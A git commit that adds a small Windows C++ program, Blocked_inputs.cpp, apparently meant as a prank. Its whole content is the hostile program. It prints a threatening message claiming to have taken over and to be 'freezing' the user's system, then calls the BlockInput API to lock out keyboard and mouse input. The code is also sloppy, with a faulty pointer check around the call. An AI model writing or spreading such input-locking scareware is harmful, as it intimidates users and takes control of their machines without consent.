c36cb7bc4f2b6c70ea8463d25ab145361e47628d
Chaelgutierrez <leeez711@gmail.com>
2016-07-18 08:47:23 +0800

    file added

---
+++ Blocked_inputs.cpp
@@ -0,0 +1,41 @@
+//Chaelgutierrez
+#include <stdio.h> // pwede iostream but mas ok if original header ng c ang gamit
+#include <windows.h>//para sa windows user library
+#include <conio.h>
+#include <string.h>
+#include <iostream>
+using namespace std;
+ 	
+int main(){
+	system("color a");
+	SetConsoleTitle("Chael_gutierrez");
+	cout<<"Hello this is Chael Im on your system...\nIm freezing now your system, Don't do anything or else I'll break your system...";
+		                                                                               
+	HINSTANCE hDLL= LoadLibraryW(L"user32.dll");        //user32.dll checker para sa xp and 7 above
+	if(hDLL== NULL){
+	 		   fprintf(stderr,"Failed to load user32.DLL file,error code %d\n",GetLastError());
+	 		   return 1;
+			  }
+			  
+ 			  typedef BOOL(WINAPI *BLOCKINPUT)(BOOL);
+ 			  BLOCKINPUT pBlockInput;
+ 			  pBlockInput=(BLOCKINPUT) GetProcAddress(hDLL,"BlockInput");
+ 			  if(*pBlockInput == NULL){
+ 					    //fprintf(stderr,"Failed to import BlockInput, error code %d\n",GetLastError());
+ 					    FreeLibrary(hDLL);
+ 					    return 1;
+					   }
+	
+	else{
+		 
+		 BOOL res= pBlockInput(TRUE);
+		 if(res){
+		 		   //fprintf(stderr,"Block Input Failed, error code %d\n",GetLastError());
+				  }
+		 		  Sleep(1000);
+				  }
+
+	FreeLibrary(hDLL);         
+	_getch();
+	                                                                                     
+}
